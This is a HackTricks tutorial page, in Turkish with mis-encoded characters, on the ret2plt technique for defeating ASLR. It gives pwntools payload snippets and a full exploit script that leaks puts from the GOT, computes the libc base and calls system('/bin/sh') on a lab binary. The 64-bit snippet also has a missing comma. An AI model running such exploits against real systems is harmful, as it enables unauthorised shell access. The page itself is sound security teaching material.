# Ret2plt

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

Bu teknikteki amaÃ§, **PLT'den bir iÅŸlevin adresini sÄ±zdÄ±rmak** ve ASLR'yi atlamak iÃ§in kullanmaktÄ±r. Bu, Ã¶rneÄŸin, libc'den `puts` iÅŸlevinin adresini sÄ±zdÄ±rÄ±rsanÄ±z, ardÄ±ndan **`libc`'nin tabanÄ±nÄ± hesaplayabilir** ve diÄŸer iÅŸlevlere eriÅŸmek iÃ§in **`system`** gibi iÅŸlevlere eriÅŸmek iÃ§in ofsetleri hesaplayabilirsiniz.

Bu, `pwntools` yÃ¼kÃ¼yle ÅŸu ÅŸekilde yapÄ±labilir ([**buradan**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
**`puts`** (PLT adresinden kullanÄ±larak) `puts`'Ä±n GOT'ta (Global Offset Table) bulunan adresi ile Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin. Bu, `puts` GOT girdisini yazdÄ±rdÄ±ÄŸÄ±nda, bu girdinin hafÄ±zadaki `puts`'Ä±n tam adresini iÃ§ereceÄŸi anlamÄ±na gelir.

AyrÄ±ca, exploit iÃ§inde `main`in adresinin kullanÄ±ldÄ±ÄŸÄ±na dikkat edin, bÃ¶ylece `puts` iÅŸlemini bitirdiÄŸinde, **binary Ã§Ä±kÄ±ÅŸ yapmak yerine `main`i tekrar Ã§aÄŸÄ±rÄ±r** (bu nedenle sÄ±zdÄ±rÄ±lan adres geÃ§erli olmaya devam eder).

{% hint style="danger" %}
Bu iÅŸlem iÃ§in Ã§alÄ±ÅŸmasÄ± iÃ§in **binary'nin PIE ile derlenmemiÅŸ olmasÄ±** veya PLT, GOT ve main adreslerini bilmek iÃ§in **PIE'yi atlatmak iÃ§in bir sÄ±zÄ±ntÄ± bulmuÅŸ olmanÄ±z** gerekir. Aksi takdirde, Ã¶nce PIE'yi atlatmanÄ±z gerekir.
{% endhint %}

Bu atlatmanÄ±n [**tam Ã¶rneÄŸini burada bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Bu, o **Ã¶rneÄŸin** son exploit'iydi:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## DiÄŸer Ã¶rnekler ve Referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ancak PIE yok, ilk adÄ±m, bir taÅŸma oluÅŸturarak canary'nin 0x00 baytÄ±na kadar doldurulmasÄ± ve ardÄ±ndan puts'u Ã§aÄŸÄ±rarak sÄ±zdÄ±rmaktÄ±r. Canary ile puts'u Ã§aÄŸÄ±rmak iÃ§in ROP cihazÄ± oluÅŸturulur ve GOT'tan puts adresini sÄ±zdÄ±rmak iÃ§in bir ROP cihazÄ± ve `system('/bin/sh')` Ã§aÄŸÄ±rmak iÃ§in bir ROP cihazÄ± oluÅŸturulur.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, canary yok, ana fonksiyondan bir Ã§ocuk fonksiyonundan yÄ±ÄŸÄ±n taÅŸmasÄ±. Puts'u Ã§aÄŸÄ±rmak iÃ§in ROP cihazÄ± oluÅŸturarak GOT'tan puts adresini sÄ±zdÄ±rmak ve ardÄ±ndan bir tane cihazÄ± Ã§aÄŸÄ±rmak iÃ§in.
